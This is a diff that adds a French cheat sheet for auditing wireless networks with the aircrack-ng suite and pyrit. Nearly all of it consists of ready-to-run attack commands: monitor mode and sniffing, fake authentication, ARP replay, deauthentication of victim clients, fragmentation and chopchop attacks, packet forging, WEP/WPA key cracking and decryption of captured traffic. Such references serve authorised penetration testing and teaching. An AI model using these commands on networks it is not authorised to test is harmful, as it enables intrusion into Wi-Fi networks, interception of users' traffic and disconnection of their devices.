@@ -1,0 +1,64 @@
+Cheat Sheet : Audit des Réseaux Sans Fil
+
+1. **Vérifier Chipset/Drivers**
+    - `airmon-ng` - Vérifier si le chipset/les drivers sont détectés
+    - `airmon-ng check` - Vérifier si un processus est problématique
+    - `airmon-ng check kill` - Tuer le processus problématique
+
+2. **Mode Moniteur**
+    - `airmon-ng start wlan0` - Démarrer le mode moniteur
+    - `airmon-ng start wlan0 3` - Démarrer le mode moniteur sur le canal 3
+    - `airmon-ng stop mon0` - Arrêter le mode moniteur
+
+3. **Capture de Paquets**
+    - Peut suivre la localisation géographique des points d'accès
+    - `airodump-ng mon0` - Sniffer sur mon0
+    - `airodump-ng -c <canal> --bssid <MAC AP> -w <nom de fichier> <interface>` - Commencer à sniffer avec des paramètres spécifiques
+
+4. **Test d'Injection**
+    - `aireplay-ng -9 mon0` - Carte unique
+    - `aireplay-ng -9 -i <carte de réception> <mon0>`
+
+5. **Authentification Factice**
+    - `aireplay-ng -1 0 -e <ESSID> -a <MAC AP> -h <MAC Attaquant> <interface>` - 0 représente le nombre de fois à se réassocier avec l'AP
+    - `aireplay-ng -1 0 -e <ESSID> -y <fichier keystream> -a <MAC AP> -h <MAC Attaquant> <interface>` - Avec fichier keystream pour contourner la clé partagée
+
+6. **Attaque de Relecture de Requêtes ARP**
+    - `aireplay-ng -3 -b <MAC AP> -h <MAC Attaquant> <interface>`
+
+7. **Attaque de Désauthentification**
+    - `aireplay-ng -0 1 -a <MAC AP> -c <MAC Victime> <interface>`
+
+8. **Attaques de Relais de Paquets**
+    - Interactif : `aireplay-ng -2 -b <MAC AP> -d FF:FF:FF:FF:FF:FF -t 1 <interface>`
+    - Modifié : `aireplay-ng -2 -b <MAC AP> -t 1 -c FF:FF:FF:FF:FF:FF -p 0841`
+    - Naturel : `aireplay-ng -2 -b <MAC AP> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>`
+    - Injection avec fichier : `aireplay-ng -2 -r capture.cap mon0`
+
+9. **Attaque de Fragmentation**
+    - `aireplay-ng -5 -b <MAC AP> -h <MAC Attaquant> mon0`
+
+10. **Korek Chop Chop**
+     - `aireplay-ng -4 -b <MAC AP> -h <MAC Attaquant> <interface>`
+
+11. **Créer une Requête ARP en Utilisant un Fichier XOR**
+     - `packetforge-ng -0 <MAC AP> -h <MAC Attaquant> -k <IP DEST> -l <IP SOURCE> -y <FICHIER XOR> -w <FICHIER SORTIE>`
+
+12. **Craquage**
+     - 64-bit : `aircrack-ng -0 -z -n 64 capturefile.cap`
+     - Attaque par dictionnaire : `aircrack-ng -w <liste de mots> capture.cap`
+
+13. **Pyrit**
+     - Analyser la poignée de main : `pyrit -r capture.cap analyze`
+     - Supprimer les données excédentaires : `pyrit -r capture.cap -o <output.cap> strip`
+     - Importer les mots de passe : `pyrit -i passwordlist.txt import_passwords`
+     - Vérifier les mots de passe de la base de données : `pyrit eval`
+     - Créer une base de données ESSID : `pyrit -e <ESSID> create_essid`
+     - Calculer PMK : `pyrit batch`
+     - Commencer le craquage : `pyrit -r capture.cap attack_db`
+     - Supprimer la base de données : `rm -rf ~/.pyrit/blobspace`
+
+14. **Airdecap-ng**
+     - Supprimer les en-têtes sans fil : `airdecap-ng -b <MAC AP> <capture.cap>`
+     - Décrypter les paquets capturés WEP : `airdecap-ng -w <CLÉ WEP> -b <MAC AP> <capture.cap>`
+     - Décrypter la capture WPA : `airdecap-ng -e <ESSID> -p <MOT DE PASSE WPA> -b <MAC AP> <capture.cap>`
